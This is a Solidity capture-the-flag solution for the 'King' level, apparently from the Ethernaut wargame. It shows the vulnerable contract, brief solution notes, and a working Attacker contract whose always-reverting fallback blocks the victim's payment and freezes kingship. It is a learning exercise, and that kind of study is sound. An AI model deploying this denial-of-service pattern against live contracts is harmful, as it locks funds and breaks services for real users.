// VICTIM CONTRACT AS GIVEN BY THE TASK DESCRIPTION
// TASK: 
// The contract below represents a very simple game: whoever sends it an amount of ether that is larger than the current prize becomes the new king. On such an event, the 
// overthrown king gets paid the new prize, making a bit of ether in the process! As ponzi as it gets xD
// Such a fun game. Your goal is to break it.
// When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() public payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  fallback() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}



//SOLUTION
//- it is impossible (imho) to become the owner. The only possible attack point is the transfer() in the fallback function. 
//- We need to make it impossible for this transfer to complete
//- The idea is to write contract that has a malicious fallback function e.g. reverts
//- get this contract to become king by sending 1 ether or more (current prize)
//- (bool sent, bytes memory data) = kingContract.call{value: (address(this).balance), gas: 4000000}("");
//- once you submit and level wants to take over and send money to king, execution fails



contract Attacker{
    
    // empty (but payable) constructor so we can seed the contract with ETH on creation
    constructor() public payable{}

	address payable victim = payable(address(0x27E19F2D5288B17d0C409f3B7F7BaC8872A79963));

	function attack() public {
	    //forward 1 ETH (= current prize) to the victim's contract to trigger its fallback function
        (bool success, ) =  victim.call{value: 1000000000000000000, gas: 4000000}("");
	    require(success);
	}	
	
	fallback() external payable{
	    // just make sure that the transaction will be reverted so the victim contract's fallback function can never complete
		revert("Haha, you wont get your money back, mate");
	}
	
	// Helper function to not run out of (test) ETH while trying various attacks
    function returnEthToDaniel() public {
        
        address payable daniel = payable(address(0x1cA1A73112187C54DF8025b3A0607f4DD6b924fD));
        
        daniel.call{value: address(this).balance}("");
    }

}